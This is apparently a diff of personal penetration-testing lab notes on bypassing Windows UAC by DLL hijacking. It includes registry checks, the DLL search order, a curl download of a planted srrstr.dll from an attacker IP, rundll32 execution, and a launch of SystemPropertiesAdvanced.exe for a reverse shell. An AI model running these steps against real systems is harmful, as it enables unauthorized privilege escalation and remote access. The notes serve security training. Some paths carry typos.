@@ -6,22 +6,46 @@ https://learn.microsoft.com/en-us/windows/security/identity-protection/user-acco
 
 ![[Pasted image 20230107092515.png]]
 
-```
-Confirm UAC is Enabled:
-REG QUERY HKEY_LOCAL_MACHINE\Sofware\Microsoft\Windows\CurrentVersion\Policies\System\
-		/v EnableLUA
+#### Checking Current User
 
-Checking UAC Level:
-REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
-		/v 
+![[Pasted image 20230107111341.png]]
 
-Checking Windows Version:
-	[environment]::OSVersion.Version
+#### Confirming Admin Group Membership
+
+![[Pasted image 20230107111410.png]]
+
+#### Reviewing User Privileges
+
+![[Pasted image 20230107111429.png]]
+
+#### Confirming UAC is Enabled
+```cmd-session
+C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    EnableLUA    REG_DWORD    0x1
 ```
+
+#### Checking UAC Level
+
+```cmd-session
+C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
+```
+
+0x5 is the highest UAC level of `Always Notify`.
+
+#### Checking Windows Version
+
+![[Pasted image 20230107111801.png]]
 
 ![[Pasted image 20230107092941.png]]
 
 https://github.com/hfiref0x/UACME project maintains a list of UAC bypasses.
+
+## Scenario
 
 ###### When attempting to locate a DLL, Windows uses this following order:
 ```
@@ -30,11 +54,7 @@ https://github.com/hfiref0x/UACME project maintains a list of UAC bypasses.
 3. 16-bit System Directory C:\Windows\System
 4. The Windows Directory
 5. Any directories listed in PATH
-
-cmd /c echo %PATH%
 ```
-
-## Scenario
 
 32-bit `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used
 by System Restore functionality
@@ -58,7 +78,7 @@ curl http://10.10.14.3:8080/srrstr.dll -O
 rundll32 shell32.dll,Control_RunDLL \
 		C:\Users\sarah]AppData\Local\Microsoft\WIndowsApps\srrstr.dll
 
-C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe -> Reverse Shell
 ```
 
 
